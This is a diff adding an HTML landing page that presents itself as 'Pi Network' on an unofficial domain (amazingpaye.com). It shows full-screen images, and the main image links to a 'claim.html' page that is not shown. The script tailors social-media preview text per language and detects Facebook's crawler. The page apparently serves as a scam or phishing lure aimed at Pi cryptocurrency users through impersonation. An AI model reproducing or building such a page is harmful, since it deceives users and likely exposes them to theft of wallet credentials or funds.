@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pi Network - La Cryptomonnaie Accessible</title>
+    
+    <!-- Balises Open Graph dynamiques -->
+    <meta property="og:title" content="Pi Network - Mine Free on Mobile">
+    <meta property="og:description" content="Join Pi Network and start mining Pi cryptocurrency now on your smartphone. No battery drain!">
+    <meta property="og:image" content="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:url" content="https://amazingpaye.com">
+    <meta property="og:type" content="website">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:locale:alternate" content="fr_FR">
+    <meta property="og:locale:alternate" content="es_ES">
+    <meta property="og:site_name" content="Pi Network">
+    
+    <!-- Balises Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Pi Network - Mine Free on Mobile">
+    <meta name="twitter:description" content="Join Pi Network and start mining Pi cryptocurrency">
+    <meta name="twitter:image" content="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: #000;
+            min-height: 100vh;
+            touch-action: pan-x pan-y;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            overflow-x: hidden;
+        }
+        
+        html {
+            touch-action: manipulation;
+        }
+        
+        .main-image, .continuation-image {
+            width: 100%;
+            height: auto;
+            display: block;
+            vertical-align: bottom;
+        }
+        
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            z-index: 10;
+        }
+        
+        .footer img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Section COMPLÈTEMENT masquée pour l'image Facebook */
+        .facebook-section {
+            position: absolute !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            width: 1px !important;
+            height: 1px !important;
+            overflow: hidden !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            z-index: -9999 !important;
+            visibility: hidden !important;
+        }
+        
+        .facebook-image {
+            width: 1200px;
+            height: 630px;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+    <!-- Section COMPLÈTEMENT MASQUÉE pour l'image Facebook -->
+    <div class="facebook-section" id="facebookPreview" aria-hidden="true">
+        <img class="facebook-image" 
+             src="https://i.postimg.cc/3x0Nrn1p/Go-2.png" 
+             alt="Pi Network Mobile App"
+             id="ogImage">
+    </div>
+    
+    <!-- Image principale cliquable -->
+    <img class="main-image" 
+         src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
+         alt="Image principale Pi Network" 
+         onclick="window.location.href='claim.html'">
+    
+    <!-- Image de continuation -->
+    <img class="continuation-image" 
+         src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
+         alt="Interface Pi Network">
+    
+    <!-- Pied de page fixe -->
+    <footer class="footer">
+        <img src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_165420094.jpg?raw=true" 
+             alt="Télécharger Pi Network">
+    </footer>
+
+    <script>
+        // Textes multilingues pour les aperçus Facebook
+        const ogTranslations = {
+            en: {
+                title: "Pi Network - Mine Free on Mobile",
+                description: "Join Pi Network and start mining Pi cryptocurrency now on your smartphone. No battery drain!",
+                imageAlt: "Pi Network Mobile App"
+            },
+            fr: {
+                title: "Pi Network - Minez Gratuitement sur Mobile",
+                description: "Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi dès maintenant sur votre smartphone. Sans consommation de batterie!",
+                imageAlt: "Application Mobile Pi Network"
+            },
+            es: {
+                title: "Pi Network - Minera Gratis en Móvil",
+                description: "Únete a Pi Network y comienza a minar la criptomoneda Pi ahora en tu smartphone. ¡Sin consumo de batería!",
+                imageAlt: "Aplicación Móvil Pi Network"
+            },
+            de: {
+                title: "Pi Network - Kostenlos am Handy minen",
+                description: "Trete Pi Network bei und beginne jetzt auf deinem Smartphone mit dem Mining der Pi-Kryptowährung. Kein Batterieverbrauch!",
+                imageAlt: "Pi Network Mobile App"
+            },
+            ar: {
+                title: "Pi Network - تعدين مجاني على الهاتف",
+                description: "انضم إلى Pi Network وابدأ في تعدين عملة Pi المشفرة الآن على هاتفك الذكي. بدون استنزاف البطارية!",
+                imageAlt: "تطبيق Pi Network للهواتف"
+            },
+            pt: {
+                title: "Pi Network - Minerar Grátis no Celular",
+                description: "Junte-se à Pi Network e comece a minerar a criptomoeda Pi agora no seu smartphone. Sem consumo de bateria!",
+                imageAlt: "Aplicativo Mobile Pi Network"
+            },
+            ru: {
+                title: "Pi Network - Майнинг на Телефоне Бесплатно",
+                description: "Присоединяйтесь к Pi Network и начните майнить криптовалюту Pi прямо сейчас на своем смартфоне. Без расхода батареи!",
+                imageAlt: "Мобильное приложение Pi Network"
+            },
+            zh: {
+                title: "Pi Network - 手机免费挖矿",
+                description: "加入Pi Network，立即在您的智能手机上开始挖掘Pi加密货币。不耗电！",
+                imageAlt: "Pi Network 移动应用"
+            }
+        };
+
+        // Détection de la langue pour Facebook
+        function detectFacebookLanguage() {
+            // Vérifier les paramètres d'URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const forcedLang = urlParams.get('lang');
+            if (forcedLang && ogTranslations[forcedLang]) {
+                return forcedLang;
+            }
+
+            // Détection par navigateur (pour Facebook)
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isFacebookBot = userAgent.includes('facebookexternalhit');
+            
+            if (isFacebookBot) {
+                // Détection géographique basique pour Facebook
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                if (timezone.includes('Europe/Paris') || timezone.includes('Europe/Brussels')) return 'fr';
+                if (timezone.includes('Europe/Madrid') || timezone.includes('America/Mexico')) return 'es';
+                if (timezone.includes('Europe/Berlin') || timezone.includes('Europe/Vienna')) return 'de';
+                if (timezone.includes('Asia/Riyadh') || timezone.includes('Asia/Dubai')) return 'ar';
+                if (timezone.includes('America/Sao_Paulo') || timezone.includes('Europe/Lisbon')) return 'pt';
+                if (timezone.includes('Europe/Moscow')) return 'ru';
+                if (timezone.includes('Asia/Shanghai') || timezone.includes('Asia/Taipei')) return 'zh';
+            }
+            
+            return 'en'; // Par défaut anglais
+        }
+
+        // Mettre à jour les balises OG selon la langue
+        function updateOGTags(lang) {
+            const translation = ogTranslations[lang] || ogTranslations.en;
+            
+            // Mettre à jour les balises OG (pour Facebook)
+            document.querySelector('meta[property="og:title"]').setAttribute('content', translation.title);
+            document.querySelector('meta[property="og:description"]').setAttribute('content', translation.description);
+            document.querySelector('meta[property="og:locale"]').setAttribute('content', getLocaleCode(lang));
+            
+            // Mettre à jour Twitter
+            document.querySelector('meta[name="twitter:title"]').setAttribute('content', translation.title);
+            document.querySelector('meta[name="twitter:description"]').setAttribute('content', translation.description);
+            
+            // Mettre à jour l'image alt (masquée)
+            document.getElementById('ogImage').alt = translation.imageAlt;
+        }
+
+        // Obtenir le code locale
+        function getLocaleCode(lang) {
+            const locales = {
+                'en': 'en_US',
+                'fr': 'fr_FR', 
+                'es': 'es_ES',
+                'de': 'de_DE',
+                'ar': 'ar_AR',
+                'pt': 'pt_BR',
+                'ru': 'ru_RU',
+                'zh': 'zh_CN'
+            };
+            return locales[lang] || 'en_US';
+        }
+
+        // Initialisation au chargement
+        document.addEventListener('DOMContentLoaded', function() {
+            const detectedLang = detectFacebookLanguage();
+            updateOGTags(detectedLang);
+            
+            // Forcer le chargement de l'image OG pour Facebook
+            const ogImage = new Image();
+            ogImage.src = 'https://i.postimg.cc/3x0Nrn1p/Go-2.png?' + new Date().getTime();
+            
+            console.log('Facebook OG tags configured for language:', detectedLang);
+        });
+
+        // Gestion spéciale pour le débogage Facebook
+        if (window.location.search.includes('fb_locale')) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const fbLocale = urlParams.get('fb_locale');
+            
+            let lang = 'en';
+            if (fbLocale.startsWith('fr')) lang = 'fr';
+            else if (fbLocale.startsWith('es')) lang = 'es';
+            else if (fbLocale.startsWith('de')) lang = 'de';
+            else if (fbLocale.startsWith('ar')) lang = 'ar';
+            else if (fbLocale.startsWith('pt')) lang = 'pt';
+            else if (fbLocale.startsWith('ru')) lang = 'ru';
+            else if (fbLocale.startsWith('zh')) lang = 'zh';
+            
+            updateOGTags(lang);
+        }
+    </script>
+</body>
+</html>
